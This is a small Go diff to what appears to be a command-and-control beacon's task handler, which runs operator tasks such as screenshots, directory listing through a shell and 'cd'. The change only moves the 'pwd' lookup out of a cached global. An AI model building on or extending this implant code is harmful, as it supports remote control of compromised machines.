@@ -18,8 +18,6 @@ import (
 	"github.com/vova616/screenshot"
 )
 
-var PWD, _ = hg.GetPwd()
-
 func ExecTasks(tasksToDo []string, sleep *int, agentid string, useragent string, key []byte, beacon_name string, rhost string, url string) {
 	for _, task := range tasksToDo {
 		var data string
@@ -99,7 +97,7 @@ func ExecTasks(tasksToDo []string, sleep *int, agentid string, useragent string,
 
 			hg.DeleteFile("./temp.png")
 		case "pwd":
-			data = PWD
+			data, _ = hg.GetPwd()
 		case "ls":
 			data, _ = hg.PsReturn("dir " + taskData)
 		case "cd":
